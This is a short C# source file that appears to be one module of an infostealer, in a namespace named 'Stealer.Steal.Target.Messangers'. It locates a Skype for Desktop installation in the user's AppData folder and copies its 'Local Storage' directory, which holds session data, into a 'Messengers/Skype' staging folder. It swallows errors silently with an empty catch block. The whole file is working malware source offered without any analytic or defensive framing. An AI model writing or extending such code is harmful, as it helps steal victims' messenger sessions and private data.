using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Skype
{
	public static string SkypePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Skype for Desktop");

	public static void Start()
	{
		try
		{
			if (Directory.Exists(SkypePath))
			{
				string text = Path.Combine(SkypePath, "Local Storage");
				if (Directory.Exists(text))
				{
					Counter.Skype = true;
					DynamicFiles.CopyDirectory(text, Path.Combine("Messengers", "Skype", "Local Storage"));
				}
			}
		}
		catch
		{
		}
	}
}
